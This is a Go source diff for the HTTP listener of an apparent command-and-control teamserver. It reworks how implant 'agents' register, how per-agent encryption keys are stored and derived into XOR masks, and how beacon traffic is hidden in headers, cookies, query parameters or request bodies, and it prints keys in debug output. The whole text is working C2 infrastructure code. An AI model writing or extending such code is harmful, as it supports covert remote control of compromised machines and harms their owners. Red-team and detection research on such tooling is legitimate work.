@@ -415,6 +415,11 @@ func print_output_config(output *OutputConfig, indent int) {
 func (handler *HTTP) Start(ts Teamserver) error {
 	var err error = nil
 
+    if handler.Active {
+        fmt.Printf("[DEBUG] Listener '%s' already active, skipping start\n", handler.Name)
+        return nil
+    }
+
 	cfg := handler.Config
 
 	if cfg.ProfileContent == "" {
@@ -439,12 +444,12 @@ func (handler *HTTP) Start(ts Teamserver) error {
 	router.GET("/*endpoint", handler.process_request)
 	router.POST("/*endpoint", handler.process_request)
 
-	handler.Active = true
-
 	handler.Server = &http.Server{
 		Addr:    fmt.Sprintf("%s:%d", handler.Config.HostBind, handler.Config.PortBind),
 		Handler: router,
 	}
+
+	errChan := make(chan error, 1)
 
 	if handler.Config.Ssl {
 		fmt.Printf("   Started listener '%s': https://%s:%d\n", handler.Name, handler.Config.HostBind, handler.Config.PortBind)
@@ -479,7 +484,6 @@ func (handler *HTTP) Start(ts Teamserver) error {
 			}
 		}
 
-		// CARREGA CERTIFICADO - IGUAL TransportHTTP
 		cert, err := tls.LoadX509KeyPair(handler.Config.SslCertPath, handler.Config.SslKeyPath)
 		if err != nil {
 			handler.Active = false
@@ -491,29 +495,38 @@ func (handler *HTTP) Start(ts Teamserver) error {
 		}
 
 		go func() {
-			err = handler.Server.ListenAndServeTLS("", "")
+			err := handler.Server.ListenAndServeTLS("", "")
 			if err != nil && !errors.Is(err, http.ErrServerClosed) {
-				fmt.Printf("Error starting HTTPS server: %v\n", err)
+				errChan <- err
 				return
 			}
-			handler.Active = true
+			errChan <- nil
 		}()
 
 	} else {
-		fmt.Printf("   Started listener '%s': http://%s:%d\n", handler.Name, handler.Config.HostBind, handler.Config.PortBind)
+		fmt.Printf("   Starting listener '%s': http://%s:%d\n", handler.Name, handler.Config.HostBind, handler.Config.PortBind)
 
 		go func() {
 			err := handler.Server.ListenAndServe()
 			if err != nil && !errors.Is(err, http.ErrServerClosed) {
-				fmt.Printf("Error starting HTTP server: %v\n", err)
+				errChan <- err
 				return
 			}
-			handler.Active = true
+			errChan <- nil
 		}()
 	}
 
-	time.Sleep(500 * time.Millisecond)
-	return err
+	select {
+	case err := <-errChan:
+		if err != nil {
+			handler.Active = false
+			return fmt.Errorf("failed to start listener: %v", err)
+		}
+	case <-time.After(500 * time.Millisecond):
+		handler.Active = true
+	}
+
+	return nil
 }
 
 func (handler *HTTP) Stop() error {
@@ -550,15 +563,12 @@ func (handler *HTTP) process_request(ctx *gin.Context) {
 		agentData      []byte
 		responseData   []byte
 
-		key     []byte
-		maskkey []byte
-		crypt       *LokyCrypt
-		encrypted    []byte
+		key       []byte
+		crypt     *LokyCrypt
+		encrypted []byte
 
 		server ServerRequest
 		client ClientRequest
-
-		// httpTask *HttpTask
 
 		callbackByHost *Callback
 		callback       *Callback
@@ -654,6 +664,20 @@ func (handler *HTTP) process_request(ctx *gin.Context) {
 
 	agentData = client.Payload
 
+	if len(oldID) >= 8 {
+		oldAgentID = string(oldID[:8])
+	} else {
+		oldAgentID = hex.EncodeToString(oldID)
+	}
+
+	deriveMaskKey := func(encryptKey []byte) []byte {
+		mask := make([]byte, len(encryptKey))
+		for i := range encryptKey {
+			mask[len(encryptKey)-1-i] = encryptKey[i]
+		}
+		return mask
+	}
+
 	// New agent
 	if !agentExist {
 		if len(oldID) < 8 {
@@ -661,7 +685,6 @@ func (handler *HTTP) process_request(ctx *gin.Context) {
 			return
 		}
 
-		oldAgentID = string(oldID[:8])
 		fmt.Printf("[INFO] Creating new agent: %s\n", oldAgentID)
 
 		agentDataRes, err := ModuleObject.ts.TsAgentCreate(agentType, oldAgentID, client.Payload, handler.Name, client.Address, true)
@@ -669,6 +692,9 @@ func (handler *HTTP) process_request(ctx *gin.Context) {
 			errorRet(false, fmt.Sprintf("failed to create agent: %v", err))
 			return
 		}
+
+		newAgentID := agentDataRes.Id
+		fmt.Printf("[DEBUG] Teamserver assigned new ID: %s\n", newAgentID)
 
 		randomID := make([]byte, 19)
 		_, err = rand.Read(randomID)
@@ -682,15 +708,32 @@ func (handler *HTTP) process_request(ctx *gin.Context) {
 		fmt.Printf("[DEBUG] New ID: %s\n", newID)
 		fmt.Printf("[DEBUG] Old ID: %s\n", oldID)
 
-		maskkey   = handler.Config.MaskKey
-		key 	  = handler.Config.EncryptKey
-		crypt 	  = NewLokyCrypt(key, key)
+		key, err = ModuleObject.ts.TsExtenderDataLoad(handler.Name, "key_"+oldAgentID)
+		if err != nil {
+			errorRet(false, fmt.Sprintf("failed to load key for new agent %s: %v", oldAgentID, err))
+			return
+		}
+
+		if newAgentID != oldAgentID {
+			err = ModuleObject.ts.TsExtenderDataSave(handler.Name, "key_"+newAgentID, key)
+			if err != nil {
+				fmt.Printf("[WARNING] Failed to save key for new agent ID %s: %v\n", newAgentID, err)
+			} else {
+				fmt.Printf("[DEBUG] Key also saved for new ID: %s\n", newAgentID)
+			}
+		}
+
+		fmt.Printf("[INFO] Response key for new agent %s: %02x\n", oldAgentID, key)
+
+		crypt     = NewLokyCrypt(key, key)
 		encrypted = crypt.Encrypt(newID)
 
 		combined := append(oldID, encrypted...)
 
 		if serverOutput.Mask {
-			xor(combined, maskkey)
+			maskKey := deriveMaskKey(key)
+			fmt.Printf("[DEBUG] Applying mask to response: %02x\n", maskKey)
+			xor(combined, maskKey)
 		}
 
 		switch serverOutput.Format {
@@ -704,18 +747,16 @@ func (handler *HTTP) process_request(ctx *gin.Context) {
 			responseData = []byte(base64.URLEncoding.EncodeToString(combined))
 		case "raw":
 			responseData = combined
+		default:
+			responseData = combined
 		}
+
+		fmt.Printf("[DEBUG] Response format: %s, length: %d\n", serverOutput.Format, len(responseData))
 
 		server.Payload = responseData
 
 	// Existing agent
 	} else if len(agentData) > 0 {
-		if len(oldID) >= 8 {
-			oldAgentID = string(oldID[:8])
-		} else {
-			oldAgentID = hex.EncodeToString(oldID)
-		}
-
 		fmt.Printf("[INFO] Processing data for existing agent id: %s\n", oldAgentID)
 
 		_ = ModuleObject.ts.TsAgentSetTick(oldAgentID, handler.Name)
@@ -729,15 +770,22 @@ func (handler *HTTP) process_request(ctx *gin.Context) {
 				if err != nil {
 					fmt.Printf("[ERROR] Failed to get hosted data: %v\n", err)
 				} else if len(hostedData) > 0 {
-					key = handler.Config.EncryptKey
-					maskkey = handler.Config.MaskKey
+					key, err = ModuleObject.ts.TsExtenderDataLoad(handler.Name, "key_"+oldAgentID)
+					if err != nil {
+						fmt.Printf("[ERROR] Failed to load key for agent %s: %v\n", oldAgentID, err)
+						errorRet(false, fmt.Sprintf("failed to load key for agent %s: %v", oldAgentID, err))
+						return
+					}
+
 					crypt = NewLokyCrypt(key, key)
 					encrypted = crypt.Encrypt(hostedData)
 
 					combined := append(oldID, encrypted...)
 
 					if serverOutput.Mask {
-						xor(combined, maskkey)
+						maskKey := deriveMaskKey(key)
+						fmt.Printf("[DEBUG] Applying mask to response: %02x\n", maskKey)
+						xor(combined, maskKey)
 					}
 
 					switch serverOutput.Format {
@@ -751,9 +799,11 @@ func (handler *HTTP) process_request(ctx *gin.Context) {
 						responseData = []byte(base64.URLEncoding.EncodeToString(combined))
 					case "raw":
 						responseData = combined
+					default:
+						responseData = combined
 					}
 
-					fmt.Printf("[INFO] Response key: %02x\n", key)
+					fmt.Printf("[INFO] Response key for agent %s: %02x\n", oldAgentID, key)
 
 					server.Payload = responseData
 				}
@@ -814,12 +864,10 @@ func (handler *HTTP) process_request(ctx *gin.Context) {
 				ctx.Writer.Write([]byte(serverOutput.Body))
 			}
 		} else if serverOutput != nil && serverOutput.Parameter != "" {
-			// Parameter output - response in body
 			fmt.Printf("[DEBUG] Output in parameter\n")
 			ctx.Status(http.StatusOK)
 			ctx.Writer.Write([]byte(server.EmptyResp))
 		} else if serverOutput != nil && serverOutput.Cookie != "" {
-			// Cookie output - response in Set-Cookie header
 			fmt.Printf("[DEBUG] Output in cookie: %s\n", serverOutput.Cookie)
 			ctx.Writer.Header().Set("Set-Cookie", fmt.Sprintf("%s=%s", serverOutput.Cookie, string(server.EmptyResp)))
 			ctx.Status(http.StatusOK)
@@ -841,7 +889,7 @@ func (handler *HTTP) parse_client_data(ctx *gin.Context, client *ClientRequest, 
 	var (
 		old_agent_id   []byte
 		agent_adp_id   []byte
-		full_data      io.Reader
+		full_data 	   io.Reader
 		processed_data []byte
 		agent_exist    bool
 
@@ -851,61 +899,55 @@ func (handler *HTTP) parse_client_data(ctx *gin.Context, client *ClientRequest, 
 		encrypted_data []byte
 		decrypted_data []byte
 	)
-
+    
 	if output.Header != "" {
 		headerValue := ctx.GetHeader(output.Header)
 		if headerValue == "" {
 			return "", nil, false, errors.New("header not found")
 		}
-
 		headerValue = strings.ReplaceAll(headerValue, " ", "+")
-
 		full_data = bytes.NewBuffer([]byte(headerValue))
 	} else if output.Cookie != "" {
 		cookieValue, err := ctx.Cookie(output.Cookie)
 		if err != nil || cookieValue == "" {
 			return "", nil, false, errors.New("cookie not found")
 		}
-
 		cookieValue = strings.ReplaceAll(cookieValue, " ", "+")
-
 		full_data = bytes.NewBuffer([]byte(cookieValue))
 	} else if output.Parameter != "" {
-		fmt.Printf("[DEBUG] param key: %s\n", output.Parameter)
+		fmt.Printf("param key: %s\n", output.Parameter)
 		paramValue := ctx.Query(output.Parameter)
-		fmt.Printf("[DEBUG] param value from Query: %s\n", paramValue)
+		fmt.Printf("param value from Query: %s\n", paramValue)
 		if paramValue == "" {
 			paramValue = ctx.Param(output.Parameter)
-			fmt.Printf("[DEBUG] param value from Param: %s\n", paramValue)
+			fmt.Printf("param value from Param: %s\n", paramValue)
 		}
 		if paramValue == "" {
 			return "", nil, false, errors.New("parameter not found")
 		}
-
 		full_data = bytes.NewBuffer([]byte(paramValue))
 	} else {
 		body_data, err := io.ReadAll(ctx.Request.Body)
 		if err != nil {
 			return "", nil, false, fmt.Errorf("failed to read request body: %v", err)
 		}
-
 		ctx.Request.Body = io.NopCloser(bytes.NewBuffer(body_data))
 		full_data = bytes.NewBuffer(body_data)
 	}
-
+    
 	agent_data, err := io.ReadAll(full_data)
 	if err != nil {
 		return "", nil, false, fmt.Errorf("failed to read agent data: %v", err)
 	}
 
 	fmt.Println(formatHexDump(agent_data, 16))
-
+    
 	if len(agent_data) == 0 {
 		return "", nil, false, errors.New("missing agent data")
 	}
-
+    
 	processed_data = agent_data
-
+    
 	if output.Prepend != "" {
 		prepend_bytes := []byte(output.Prepend)
 		if len(agent_data) >= len(prepend_bytes) && bytes.HasPrefix(agent_data, prepend_bytes) {
@@ -914,16 +956,16 @@ func (handler *HTTP) parse_client_data(ctx *gin.Context, client *ClientRequest, 
 			return "", nil, false, errors.New("prepend not found in data")
 		}
 	}
-
+    
 	if output.Append != "" {
 		append_data := []byte(output.Append)
 		if len(processed_data) >= len(append_data) && bytes.HasSuffix(processed_data, append_data) {
-			processed_data = processed_data[:len(processed_data)-len(append_data)]
+			processed_data = processed_data[:len(processed_data) - len(append_data)]
 		} else {
 			return "", nil, false, errors.New("append not found in data")
 		}
 	}
-
+    
 	var formatted []byte
 	switch output.Format {
 	case "base32":
@@ -953,120 +995,130 @@ func (handler *HTTP) parse_client_data(ctx *gin.Context, client *ClientRequest, 
 	default:
 		formatted = processed_data
 	}
-
+    
+	if len(formatted) < 36 {
+		return "", nil, false, fmt.Errorf("insufficient data length: got %d bytes, need at least 36", len(formatted))
+	}
+    
 	total_len := len(formatted)
+	
+	fmt.Printf("[DEBUG] Total decoded length: %d bytes\n", total_len)
 
-	fmt.Printf("[DEBUG] Step 1 - After decode (total length: %d bytes):\n", total_len)
-	fmt.Println(hex.Dump(formatted))
+	deriveMaskKey := func(encryptKey []byte) []byte {
+		mask := make([]byte, len(encryptKey))
+		for i := range encryptKey {
+			mask[len(encryptKey)-1-i] = encryptKey[i]
+		}
+		return mask
+	}
 
-	// Check if we have stored keys (existing agent session)
-	hasStoredKeys := len(handler.Config.EncryptKey) == 16 && len(handler.Config.MaskKey) == 16
+	keys, err := ModuleObject.ts.TsExtenderDataKeys(handler.Name)
+	if err == nil && len(keys) > 0 {
+		fmt.Printf("[DEBUG] Checking %d stored keys\n", len(keys))
+		
+		for _, k := range keys {
+			if !strings.HasPrefix(k, "key_") {
+				continue
+			}
+			
+			agentID := strings.TrimPrefix(k, "key_")
+			
+			storedKey, err := ModuleObject.ts.TsExtenderDataLoad(handler.Name, k)
+			if err != nil || len(storedKey) != 16 {
+				fmt.Printf("[DEBUG] Failed to load key for %s: %v\n", agentID, err)
+				continue
+			}
+			
+			storedMaskKey := deriveMaskKey(storedKey)
+			
+			fmt.Printf("[DEBUG] Testing key for agent %s: %02x (mask: %02x)\n", agentID, storedKey, storedMaskKey)
+			
+			testData := make([]byte, len(formatted))
+			copy(testData, formatted)
+			
+			if output.Mask {
+				xor(testData, storedMaskKey)
+			}
+			
+			testAgentID := string(testData[:8])
+			fmt.Printf("[DEBUG] After XOR, agent ID would be: %s (expected: %s)\n", testAgentID, agentID)
+			
+			if testAgentID == agentID {
+				fmt.Printf("[DEBUG] MATCH! Agent %s identified\n", agentID)
+				
+				if output.Mask {
+					xor(formatted, storedMaskKey)
+				}
+				
+				old_agent_id = formatted[:36]
+				agent_adp_id = old_agent_id[:8]
+				agent_exist = true
+				key = storedKey
+				encrypted_data = formatted[36:]
+				
+				fmt.Printf("[EXISTING AGENT] %s - Key: %02x\n", agentID, key)
+				
+				goto decrypt_payload
+			}
+		}
+	}
 
-	// Determine if this is a new agent or existing agent based on data size and stored keys
-	// New agent: needs at least 36 (agent_id) + 16 (key) = 52 bytes minimum
-	// Existing agent: can be smaller, just needs agent_id prefix
 
-	if total_len >= 52 && !hasStoredKeys {
-		// NEW AGENT: data contains agent_id + encrypted_data + key
-		fmt.Println("[DEBUG] Processing as NEW agent (no stored keys, sufficient data length)")
-
-		// Extract key from last 16 bytes (NOT XORed)
+	if total_len >= 52 {
+		fmt.Printf("[DEBUG] Trying as NEW AGENT (length >= 52)\n")
+		
 		extracted_key := formatted[total_len-16:]
-
-		handler.Config.EncryptKey = make([]byte, 16)
-		handler.Config.MaskKey = make([]byte, 16)
-
-		copy(handler.Config.EncryptKey, extracted_key)
-
-		for i := range extracted_key {
-			handler.Config.MaskKey[len(extracted_key)-1-i] = extracted_key[i]
-		}
-
-		key = handler.Config.EncryptKey
-		maskkey = handler.Config.MaskKey
-
-		fmt.Printf("[DEBUG] New agent - Extracted EncryptKey: %v\n", key)
-		fmt.Printf("[DEBUG] New agent - Calculated MaskKey: %v\n", maskkey)
-
-		// Apply XOR to everything EXCEPT the last 16 bytes (the key)
+		
+		maskkey = deriveMaskKey(extracted_key)
+		
+		fmt.Printf("[DEBUG] Extracted key: %02x\n", extracted_key)
+		fmt.Printf("[DEBUG] Mask key: %02x\n", maskkey)
+		
 		if output.Mask {
-			data_to_unmask := formatted[:total_len-16]
-			xor(data_to_unmask, maskkey)
-
-			fmt.Println("[DEBUG] Step 2 - After XOR (new agent, excluding last 16 bytes):")
-			fmt.Println(hex.Dump(formatted))
+			xor(formatted[:total_len-16], maskkey)
 		}
-
-		// Now extract the correct agent_id (after XOR)
+		
 		old_agent_id = formatted[:36]
 		agent_adp_id = old_agent_id[:8]
-
-		// Encrypted data: between agent_id (36) and key (16)
-		encrypted_data = formatted[36 : total_len-16]
-		agent_exist = false
-
-	} else if hasStoredKeys {
-		// EXISTING AGENT: use stored keys
-		fmt.Println("[DEBUG] Processing as EXISTING agent (has stored keys)")
-
-		key = handler.Config.EncryptKey
-		maskkey = handler.Config.MaskKey
-
-		fmt.Printf("[DEBUG] Existing agent - Using stored EncryptKey: %v\n", key)
-		fmt.Printf("[DEBUG] Existing agent - Using stored MaskKey: %v\n", maskkey)
-
-		// Apply XOR to the entire buffer
-		if output.Mask {
-			xor(formatted, maskkey)
-
-			fmt.Println("[DEBUG] Step 2 - After XOR (existing agent):")
-			fmt.Println(hex.Dump(formatted))
-		}
-
-		// For existing agent, extract agent_id only if we have enough data
-		if total_len >= 36 {
-			old_agent_id = formatted[:36]
-			agent_adp_id = old_agent_id[:8]
-			encrypted_data = formatted[36:]
-		} else if total_len >= 8 {
-			// Minimal packet - just agent_id prefix
-			old_agent_id = formatted[:total_len]
-			agent_adp_id = formatted[:8]
-			encrypted_data = nil
+		agentIDStr := string(agent_adp_id)
+		
+		fmt.Printf("[DEBUG] Agent ID after XOR: %s\n", agentIDStr)
+		
+		agent_exist = ModuleObject.ts.TsAgentIsExists(agentIDStr)
+		
+		if !agent_exist {
+			err := ModuleObject.ts.TsExtenderDataSave(handler.Name, "key_"+agentIDStr, extracted_key)
+			if err != nil {
+				return "", nil, false, fmt.Errorf("failed to save agent key: %v", err)
+			}
+			
+			fmt.Printf("[NEW AGENT] %s - Key saved: %02x\n", agentIDStr, extracted_key)
 		} else {
-			return "", nil, false, fmt.Errorf("data too short for existing agent: got %d bytes", total_len)
+			fmt.Printf("[RECONNECTING AGENT] %s\n", agentIDStr)
 		}
-
-		agent_exist = true
-
-	} else {
-		// Not enough data for new agent and no stored keys
-		return "", nil, false, fmt.Errorf("insufficient data for new agent (need >= 52 bytes, got %d) and no stored session keys", total_len)
+		
+		key = extracted_key
+		encrypted_data = formatted[36 : total_len-16]
+		
+		goto decrypt_payload
 	}
 
-	fmt.Printf("[DEBUG] Old agent_id (hex): %s\n", hex.EncodeToString(old_agent_id))
-	fmt.Printf("[DEBUG] Old agent_id (string): %s\n", string(old_agent_id))
-	fmt.Printf("[DEBUG] Agent adapter id: %s\n", string(agent_adp_id))
-	fmt.Printf("[DEBUG] Agent exists: %v\n", agent_exist)
-	fmt.Printf("[DEBUG] Encrypted data length: %d\n", len(encrypted_data))
+	return "", nil, false, fmt.Errorf("could not identify agent - total_len=%d, no matching key found", total_len)
 
-	if len(encrypted_data) > 0 {
-		fmt.Println("[DEBUG] Step 3 - Encrypted data before decrypt:")
-		fmt.Println(hex.Dump(encrypted_data))
-
-		fmt.Printf("[DEBUG] Decrypt key: %v\n", key)
-
-		crypt = NewLokyCrypt(key, key)
-		decrypted_data = crypt.Decrypt(encrypted_data)
-
-		fmt.Println("[DEBUG] Step 4 - Decrypted data:")
-		fmt.Println(hex.Dump(decrypted_data))
-
-		client.Payload = decrypted_data
-	} else {
-		fmt.Println("[DEBUG] No encrypted data to decrypt (heartbeat/keepalive packet)")
+decrypt_payload:
+	fmt.Printf("[DEBUG] Decrypting with key: %02x\n", key)
+    
+	if len(encrypted_data) == 0 {
+		fmt.Printf("[DEBUG] No encrypted data (heartbeat?)\n")
 		client.Payload = nil
+		return "c17a905a", old_agent_id, agent_exist, nil
 	}
-
+    
+	crypt = NewLokyCrypt(key, key)
+	decrypted_data = crypt.Decrypt(encrypted_data)
+    
+	client.Payload = decrypted_data
+    
 	return "c17a905a", old_agent_id, agent_exist, nil
 }
+
